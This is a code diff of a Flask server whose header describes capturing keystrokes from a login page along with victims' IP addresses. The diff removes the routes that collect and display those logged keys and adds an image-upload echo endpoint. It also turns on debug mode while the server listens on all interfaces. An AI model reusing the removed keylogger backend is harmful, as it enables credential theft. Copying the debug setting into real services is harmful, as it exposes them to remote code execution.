@@ -16,52 +16,39 @@
 # * Description: This program capture key from the login.html and display victim ip address and logged keys
 
 import os
-from flask import Flask, jsonify, request
+import base64
+import cv2
+from flask import Flask, jsonify, request, send_file, json
 
 app = Flask(__name__)
 
 keys = ""
 
+
 @app.route('/')
 def Welcome():
     return app.send_static_file('index.html')
 
-@app.route('/logger')
-def LogKeys():
-    global keys
-    key = request.args.get('key')
-    keys += '<pre>' + '{:23}'.format('ip: ' + request.remote_addr) + 'key: ' + key + '</pre>'
-    return key
 
-@app.route('/keys')
-def GetKeys():
-    return keys
+@app.route('/upload', methods=['POST'])
+def upload_file():
+    fileJson = request.get_json()
+    head, imageData = fileJson['image'].split(',', 1)
+    image = base64.decodestring(imageData)
+    image = processImage(image)
+    # print imageData
+    # print file
+    resultImageData = head + ',' + base64.encodestring(image)
+    return jsonify(result=resultImageData)
 
-@app.route('/clear')
-def ClearKeys():
-    global keys
-    keys = ""
-    return 'Clear keys success!'
 
-# @app.route('/myapp')
-# def WelcomeToMyapp():
-#     return 'Welcome again to my app running on Bluemix!'
+def processImage(image):
+    # try save image as a file
+    with open("image.jpg", "wb") as fh:
+        fh.write(image)
+    return image
 
-# @app.route('/api/people')
-# def GetPeople():
-#     list = [
-#         {'name': 'John', 'age': 28},
-#         {'name': 'Bill', 'val': 26}
-#     ]
-#     return jsonify(results=list)
-
-# @app.route('/api/people/<name>')
-# def SayHello(name):
-#     message = {
-#         'message': 'Hello ' + name
-#     }
-#     return jsonify(results=message)
 
 port = os.getenv('PORT', '5000')
 if __name__ == "__main__":
-	app.run(host='0.0.0.0', port=int(port))
+    app.run(host='0.0.0.0', port=int(port), debug=True)
